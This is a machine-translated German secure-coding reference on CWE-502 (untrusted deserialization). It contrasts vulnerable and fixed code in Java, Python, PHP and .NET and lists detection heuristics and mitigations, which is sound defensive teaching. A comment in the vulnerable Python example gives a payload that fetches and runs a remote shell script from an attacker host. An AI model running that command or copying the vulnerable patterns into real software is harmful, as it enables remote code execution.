---
description: "CWE-502: Die Deserialisierung angreifergesteuerter Daten ermöglicht über Gadget-Ketten die Ausführung beliebigen Codes. Grundursache: Die Instanziierung von Objekten während der Deserialisierung ruft Konstruktoren und Methodenketten auf."
date: 2026-04-16
tags: [security, cwe, deserialization, rce, java, python, php, dotnet, ruby, nodejs]
level: Advanced
source_sha256: 92e20c63effc9e02b9f9c40c27855017d9d48e05c66d549367a828ada6bf8c79
translation: machine
translated_at: '2026-10-24'
---
# CWE-502: Deserialisierung nicht vertrauenswürdiger Daten {#cwe-502-deserialization-of-untrusted-data}

**CWE-502** | OWASP Top 10 A08:2021 | CVSS-Basiswert-Bereich: 8.1-9.8 | Rang 16 in den CWE Top 25

## Funktionale Semantik {#functional-semantics}

Deserialisierung rekonstruiert einen Objektgraphen aus einem Byte-Strom. Die Schwachstelle entsteht, weil der Deserialisierer Objekte instanziieren und Methoden (readObject, __wakeup, __destruct, Property-Setter) aufrufen muss, **bevor** Anwendungscode das Ergebnis prüfen kann. Vom Angreifer gelieferte Daten bestimmen, welche Klassen mit welchem Zustand instanziiert werden, und ermöglichen so das Durchlaufen bereits vorhandener „Gadget-Ketten“: Sequenzen legitimer Klassenmethoden, die verkettet beliebige Betriebssystembefehle ausführen.

Der Angreifer injiziert keinen neuen Code, sondern setzt vorhandenen Code auf unerwartete Weise zusammen. Für den Exploit genügt, dass eine Gadget-Kette unter den geladenen Klassen existiert (JVM-Classpath, Python-Importbaum usw.), nicht im eigenen Anwendungscode.

## Grundursache {#root-cause}

Deserialisierungsformate, die Typinformationen zusammen mit den Daten kodieren, erlauben dem Deserialisierer, beliebige Klassen aus dem Klassenbestand der Laufzeitumgebung zu instanziieren. Die Sicherheitsgrenze, von der die Anwendung ausgeht (es kommen nur erwartete Datentypen an), fehlt auf Protokollebene. Korrekturen auf der Ebene der Datenvalidierung kommen durchweg zu spät, weil die Objektkonstruktion bereits stattgefunden hat.

## Auslösebedingungen {#trigger-conditions}

- Der Deserialisierer empfängt Daten aus: HTTP-Body/Cookie, WebSocket-Frame, Message Queue, RPC-Parameter, Datei-Upload, BLOB-Lesevorgang aus einer benutzerbeschreibbaren Datenbanktabelle, Cache-Schicht (Redis/Memcached), die aus Benutzereingaben befüllt wurde.
- Das Serialisierungsformat trägt Typmetadaten: Java-Native-Serialisierung (`AC ED 00 05`), Python-Pickle (`\x80\x04`-Opcodes), PHP-Strings `O:` / `a:`, .NET BinaryFormatter, Ruby Marshal (`\x04\x08`), YAML mit `!!`-Tags, AMF, Kryo mit Standardregistrierung.
- Bibliotheken mit Gadget-Ketten im Classpath: `commons-collections`, `spring-core`, `groovy`, `xstream`, Bibliotheken, die von `ysoserial` abgedeckt sind.

## Betroffene Ökosysteme {#affected-ecosystems}

| Plattform | Verwundbare API | Sichere Alternative |
|---|---|---|
| Java | `ObjectInputStream.readObject()` | JSON (Jackson mit Typeinschränkungen), Allowlisting über `readResolve` |
| Python | `pickle.loads()`, `yaml.load()`, `shelve` | `json`, `yaml.safe_load()`, `ast.literal_eval()` |
| PHP | `unserialize()` | `json_decode()`, Parameter `allowed_classes` setzen |
| .NET | `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter` | `System.Text.Json`, `DataContractSerializer` mit `DataContractResolver` |
| Ruby | `Marshal.load()` | JSON, MessagePack |
| Node.js | `node-serialize` (npm), Eval-Pfad von `serialize-javascript` | Reines JSON |
| XML/YAML | `XStream.fromXML()`, `yaml.load()` mit `!!python/object` | Schemavalidierende Parser, sichere Loader |

## Verwundbare Muster {#vulnerable-patterns}

### Java — ObjectInputStream ohne Allowlist {#java-objectinputstream-without-allowlist}

```java
// VULNERABLE: deserializes arbitrary classes from HTTP body
@PostMapping("/api/prefs")
public ResponseEntity<?> loadPrefs(@RequestBody byte[] data) {
    try (ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(data))) {
        UserPrefs prefs = (UserPrefs) ois.readObject(); // gadget chain executes here
        return ResponseEntity.ok(prefs);
    }
}
```

### Python — pickle auf nicht vertrauenswürdiger Eingabe {#python-pickle-on-untrusted-input}

```python
# VULNERABLE: pickle.loads executes arbitrary opcodes
import pickle, base64
from flask import request

@app.route("/restore")
def restore_session():
    data = base64.b64decode(request.cookies.get("session"))
    obj = pickle.loads(data)  # attacker payload: os.system("curl attacker.com/shell.sh|sh")
    return str(obj)
```

### PHP — unserialize ohne Klassenbeschränkung {#php-unserialize-without-class-restriction}

```php
// VULNERABLE: triggers __wakeup/__destruct on arbitrary classes
$data = base64_decode($_COOKIE['cart']);
$cart = unserialize($data); // POP chain via Symfony/Laravel gadgets
```

## Korrigierte Muster {#fixed-patterns}

### Java — ObjectInputStream mit Klassen-Allowlist {#java-objectinputstream-with-class-allowlist}

```java
// FIXED: allowlist via serialization filter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
ois.setObjectInputFilter(info -> {
    Class<?> cls = info.serialClass();
    if (cls == null) return ObjectInputFilter.Status.ALLOWED;
    if (cls == UserPrefs.class || cls == String.class) {
        return ObjectInputFilter.Status.ALLOWED;
    }
    return ObjectInputFilter.Status.REJECTED; // block gadget chains
});
UserPrefs prefs = (UserPrefs) ois.readObject();
```

### Python — pickle entfernen, JSON verwenden {#python-eliminate-pickle-use-json}

```python
# FIXED: JSON cannot instantiate arbitrary objects
import json, base64
from flask import request

@app.route("/restore")
def restore_session():
    raw = base64.b64decode(request.cookies.get("session"))
    data = json.loads(raw)  # pure data, no code execution
    prefs = UserPrefs(theme=data["theme"], lang=data["lang"])
    return str(prefs)
```

### PHP — Beschränkung über allowed_classes {#php-allowed_classes-restriction}

```php
// FIXED: restricts instantiation to known safe classes
$data = base64_decode($_COOKIE['cart']);
$cart = unserialize($data, ["allowed_classes" => ["CartItem", "ProductRef"]]);
// Returns false if unknown class encountered
if ($cart === false) { /* reject */ }
```

### .NET — BinaryFormatter ersetzen {#net-replace-binaryformatter}

```csharp
// VULNERABLE
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream); // CS0618 warning in .NET 5+, removed .NET 9

// FIXED: System.Text.Json with strict type handling
var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
var obj = JsonSerializer.Deserialize<UserPrefs>(stream, options);
```

## Erkennungsheuristiken {#detection-heuristics}

**Auslöser für statische Analyse:**
- `ObjectInputStream`, `readObject`, `readUnshared` auf einem nicht konstanten `InputStream`
- `pickle.loads`, `pickle.load`, bei denen das Argument keine von der Anwendung geöffnete Datei ist
- `yaml.load(` ohne Argument `Loader=yaml.SafeLoader`
- `unserialize(` in PHP ohne `allowed_classes`
- Verwendung von `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer` (alle veraltet)
- `Marshal.load` in Ruby auf jeder nicht fest codierten Eingabe
- `eval(` im Deserialisierungspfad von node-serialize

**Auslöser im Datenfluss:**
- Serialisierte Daten stammen aus: `request.body`, `request.cookies`, `request.headers`, Query-Parameter, Datei-Upload, Lesevorgang aus einer Message Queue
- Magic Bytes in kontrollierten Daten: `AC ED 00 05` (Java), `\x80\x04` oder `\x80\x05` (Python-Pickle v4/v5), Präfix `O:` (PHP), `\x04\x08` (Ruby Marshal)

**Auslöser über Abhängigkeiten (Vorhandensein einer Gadget-Kette):**
- Maven/Gradle: `commons-collections < 3.2.2`, `commons-beanutils < 1.9.4`, `spring-core`, `groovy-all`
- npm: `node-serialize` (jede Version, grundsätzlich unsicher)
- pip: `PyYAML < 6.0` mit `yaml.load` ohne Loader

**Indikatoren für Fehlalarme:**
- `ObjectInputStream`, das aus einer Datei liest, die die Anwendung selbst im selben Request-Lebenszyklus geschrieben hat (keine Kontrolle des Benutzers über den Inhalt).
- `pickle.loads` in Unit-Test-Fixtures, die bekannt gute Testdaten aus versionsverwalteten Dateien laden.
- Serialisierte Daten, die durch einen HMAC geschützt sind, der **vor** der Deserialisierung geprüft wird. Das verringert das Risiko, beseitigt es aber nicht, falls das HMAC-Geheimnis abfließt.

## Fallstricke {#gotchas}

- **HMAC-signierte serialisierte Daten sind nicht sicher.** Wird der Signaturschlüssel kompromittiert (Umgebungsvariable, fest codiert, Timing-Seitenkanal), kann der Angreifer gültige Signaturen fälschen. Daten niemals in Formaten mit Typmetadaten serialisieren, unabhängig davon, ob sie signiert werden.
- **JSON ist nicht generell sicher.** `json.loads` in Python ist sicher, ebenso `JSON.parse` in Node.js. Folgt jedoch auf `JSON.parse` ein `eval(result.code)` oder `new Function(result.fn)`, wird Codeausführung wieder eingeführt. Die Schwachstelle liegt in der Verwendung nach der Deserialisierung, nicht im JSON-Parser selbst.
- **Umgehung der Allowlist über Vererbung.** Ein Java-ObjectInputFilter, der `Collection` erlaubt, akzeptiert `ArrayList`, `HashMap` und jede Drittanbieter-Klasse, die `Collection` implementiert. Stattdessen Prüfungen auf finale Klassen verwenden, nicht `isAssignableFrom`.
- **Gadget-Ketten überleben Klassenaktualisierungen.** Das Patchen von `commons-collections` entfernt bekannte Gadgets, aber neue Ketten werden regelmäßig entdeckt. Allowlisting ist eine stärkere Kontrolle als reine Abhängigkeitsaktualisierungen.
- **.NET DataContractSerializer ist nur bedingt sicher.** Mit einem `DataContractResolver` kann er beliebige Typen instanziieren, wenn der Resolver permissiv ist. Das Standardverhalten (kein Resolver, nur explizit bekannte Typen) ist sicher.
- **Redis/Memcached als Deserialisierungsvektor.** Anwendungen, die Java-serialisierte Objekte aus Redis lesen, sind verwundbar, wenn ein Angreifer in den Cache-Schlüssel schreiben kann (über SSRF auf Redis oder Cache-Poisoning über ungeprüfte Schlüssel).

## Auswirkungen eines Exploits {#exploitation-impact}

- **Direkte Remote Code Execution:** Die Gadget-Kette endet in `Runtime.exec()`, `ProcessBuilder`, `os.system()` oder `eval()`.
- **Dateischreibzugriff:** Die Gadget-Kette schreibt ins Dateisystem und ermöglicht das Anlegen einer Webshell.
- **SSRF-Pivot:** Die Gadget-Kette startet ausgehende HTTP-Anfragen an interne Dienste.
- **Rechteausweitung:** Deserialisierung im Kontext eines privilegierten Dienstes (z. B. Jenkins-Master, Administration des Application Servers).

## Priorität der Gegenmaßnahmen {#mitigation-priority}

1. **Format abschaffen:** Binäre bzw. typbewusste Serialisierung durch JSON oder Protobuf (ohne Typmetadaten) ersetzen. Höchster Nutzen.
2. **Klassen auf eine Allowlist setzen:** Java-Serialisierungsfilter, PHP `allowed_classes`. Notwendig, wenn das Format nicht geändert werden kann.
3. **Integritätsprüfung vor der Deserialisierung:** Payload mit HMAC absichern und vor der Übergabe an den Deserialisierer prüfen.
4. **Netzwerkisolation:** Benötigen Gadget-Ketten ausgehende Verbindungen (DNS-Callback, Reverse Shell), ausgehenden Verkehr des Deserialisierungsprozesses blockieren.
5. **Java-Agenten zum Blockieren von Deserialisierung:** `SerialKiller`, `NotSoSerial`, `HardenedObjectInputStream` als zusätzliche Verteidigungsebene.

## Siehe auch {#see-also}

- CWE-020: Input Validation – vorgelagerte Kontrolle: Format vor der Deserialisierung validieren
- CWE-094: Code Injection – überlappende Auswirkung: Ausführung beliebigen Codes
- [[cwe-918-ssrf]] – Gadget-Ketten werden häufig genutzt, um interne HTTP-Anfragen auszulösen
- CWE-611: XML External Entities – ähnliches Muster: Der Parser instanziiert externe Ressourcen
